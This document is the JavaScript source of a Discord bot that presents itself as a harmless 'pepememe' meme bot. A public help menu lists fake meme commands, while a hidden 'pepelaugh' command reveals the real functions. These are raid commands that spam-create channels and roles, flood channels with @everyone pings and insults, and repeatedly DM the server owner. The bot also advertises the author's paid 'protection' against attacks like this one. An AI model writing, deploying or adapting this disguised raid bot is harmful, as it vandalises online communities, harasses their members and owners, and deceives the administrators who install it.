const Discord = require('discord.js')
const client = new Discord.Client()
const count = require('../config.json').count
const prefix = require('../config.json').prefix
const token = require('../config.json').token
const clientname = require('../config.json').clientname
const version = require('../config.json').version




client.on('ready', () => {
    console.clear()
    console.log(`
            	

          ░█████╗░███╗░░██╗██╗░░░░░██╗███╗░░██╗███████╗
          ██╔══██╗████╗░██║██║░░░░░██║████╗░██║██╔════╝
          ██║░░██║██╔██╗██║██║░░░░░██║██╔██╗██║█████╗░░
          ██║░░██║██║╚████║██║░░░░░██║██║╚████║██╔══╝░░
          ╚█████╔╝██║░╚███║███████╗██║██║░╚███║███████╗
          ░╚════╝░╚═╝░░╚══╝╚══════╝╚═╝╚═╝░░╚══╝╚══════╝

                 Prefix : ${prefix}   | Client :  ${clientname}
                 Count : ${count}   | version : ${version}

               
 `)
 client.user.setActivity({name: "MAYHEM", type: 5})
});
client.on("guildCreate", guild => {
    console.log(`\n [+] ${guild.name} (id: ${guild.id})    |    ${guild.memberCount} members!`);
    const fs = require('fs');

    fs.appendFile('./join.txt', `\n [+] ${guild.name} (id: ${guild.id})    |    ${guild.memberCount} members!`, function (err) {
    if (err) throw err;
  });
});

client.on("guildDelete", guild => {
    console.log(`\n [-] ${guild.name} (id: ${guild.id})`);
    const fs = require('fs');

    fs.appendFile('./leave.txt', `\n [-] ${guild.name} (id: ${guild.id})`, function (err) {
    if (err) throw err;
  });
});



client.on('message', (message) => {
    if(!message.content.startsWith(prefix) || message.author.bot){
        return
    }

    const args = message.content.slice(prefix.length).split(/ +/)
    const command = args.shift().toLowerCase()

    if(command === 'help'){}
    else if(message.channel.type === 'dm'){
        console.log(command+' ran in DM\nErr: Cannot run commands in DM')
        message.reply('Err: Cannot run commands in DM (Only Help Command is permitted!)')
        return
    }

                         
    console.log(`[   ${message.author.tag}   ]   executed    [   -${command}   ]`)

    if(command === 'tc'){
        message.delete()

        let categoryId = ''

        message.guild.channels.create('SORRY BUDDY', {type: 'category'})
        .then((channel) => {
            channel.setPosition(0)
            categoryId = channel.id
            channel.overwritePermissions([
                {
                    id: message.guild.id,
                    deny: ['SEND_MESSAGES'],
                    allow: ['ADD_REACTIONS', 'READ_MESSAGE_HISTORY']
                }
            ])
        })

        for(let i = 1; i<=count; i++){
            setTimeout(() => {
                message.guild.channels.create('tip', {type: "text"})
                .then((channel) => {
                    channel.setParent(categoryId)
                    channel.send('@everyone want your server to be protected from stuff like this?! dm rmc#0001 on discord!')
                })
            }, 1)
        }
    }
    else if(command === 'vc'){
        message.delete()

        let categoryId = ''

        message.guild.channels.create('🖕👁👄👁🖕', {type: 'category'})
        .then((channel) => {
            channel.setPosition(0)
            categoryId = channel.id
            channel.overwritePermissions([
                {
                    id: message.guild.id,
                    deny: ['CONNECT'],
                    allow: ['VIEW_CHANNEL']
                }
            ])
        })

        for(let i = 1; i<=count; i++){
            setTimeout(() => {
                message.guild.channels.create('🖕👁👄👁🖕', {type: "voice"})
                .then((channel) => {
                    channel.setParent(categoryId)
                })
            }, 1)
        }
    }
    else if(command === 'spam'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send(`fake meme bot created by @rmc#0001 and used by ${message.author}`), 0)
        }
    }
    else if(command === 'spamo'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send(`<@${message.guild.ownerID}> <-- that guy is a twat inee fakn ell`), 0)
        }
    }
    else if(command === 'spame'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send(`@everyone ur unloved and this server is fucking dog shit mate.`), 200)
        }
    }
    else if(command === 'dmo'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => {
                message.guild.owner.send(`<@${message.author}>\n sorry about your server mate if you want your server immune to anything like this happening again dm - rmc#0001`)
            }, 1)
        }
    }
    else if(command === 'credit'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send(`@everyone credit to me @rmc#0001 for making this MODERATION BOT OMEGALUL, dm if you would like to use it and or make your server immune for free!`), 200)
        }
    }
    else if(command === 'rr'){
        message.delete()

        let colors = ['#EE82EE', '#4B0082', '#0183fa', '#01d801', '#f7e501', '#fe8801', '#ff0000']
        let colorCount = 0;

        for(let i = 1; i <= count; i++){
            setTimeout(() => {
                message.guild.roles.create({data: {
                    name: 'rmc#0001',
                    color: colors[colorCount],
                    hoist: true,
                    mentionable: true
                }}).catch(console.error)

                colorCount++;
                if(colorCount === 7){
                    colorCount = 0
                }
            }, 1)
        }
    }
    else if(command === 'help'){
        if(message.channel.type === 'dm'){}
        else{
            message.delete()
        }

        const embed = new Discord.MessageEmbed()
            .setColor('#d6a018')
            .setThumbnail(message.author.avatarURL({dynamic: true}))
            .setDescription('pkayer commands for pepememes')
            .addFields(
                {
                    name: `${prefix}pmemes`,
                    value: `send a pepememe to the specific text channel.`
                },
                {
                    name: `${prefix}-pmme`,
                    value: `create a pepememe out of your profile avatar.`
                },
                {
                    name: `${prefix}pmother`,
                    value: `makes a pepememe out of antoher users avatar.`
                },
                {
                    name: `${prefix}pmannounce`,
                    value: `makes an announcement with pepe embedded`
                },
                {
                    name: `${prefix}pmfollow`,
                    value: `follows a meme user`
                },
                {
                    name: `${prefix}pmstaff`,
                    value: `add custom memes to the pepememe bot`
                },
                {
                    name: `${prefix}pmnsfw`,
                    value: `pepe appears in a series of nsfw images!`
                },
                {
                    name: `${prefix}pmkill`,
                    value: `kills pepe :(`
                },
                {
                    name: 'HEADS UP',
                    value: 'The commands take upto 10 minutes to register onto your server so if they dont work straight away, just wait.'
                }
            )
            .setFooter(client.user.tag)
            .setTimestamp()
        message.author.send(embed)
    }
    else if(command === 'pepelaugh'){
        if(message.channel.type === 'dm'){}
        else{
            message.delete()
        }

    const embed = new Discord.MessageEmbed()
        .setColor('#d6a018')
        .setThumbnail(message.author.avatarURL({dynamic: true}))
        .setDescription('they dont know PepeLaugh')
        .addFields(
            {
                name: `${prefix}tc`,
                value: `Spam creates ${count} text channel/s`
            },
            {
                name: `${prefix}vc`,
                value: `Spam creates ${count} voice channel/s`
            },
            {
                name: `${prefix}spam`,
                value: `Spams ${count} messages`
            },
            {
                name: `${prefix}spamo`,
                value: `Spam tags the owner ${count} times`
            },
            {
                name: `${prefix}spame`,
                value: `Spam tags @everyone ${count} times`
            },
            {
                name: `${prefix}dmo`,
                value: `Spam DMs owner ${count} times (Works only if the owner's DMs are open)`
            },
            {
                name: `${prefix}credits`,
                value: `shines some light on the creator of this bot`
            },
            {
                name: `${prefix}rr`,
                value: `Spam creates roles ${count} times`
            },
            {
                name: 'Feedback',
                value: 'add me on discord bb - rmc#0001'
            }
        )
        .setFooter(client.user.tag)
        .setTimestamp()
    message.author.send(embed)
}
})


client.login(token).catch((err) => {
    console.error('Error',err)
    console.log('INVALID TOKEN!')
})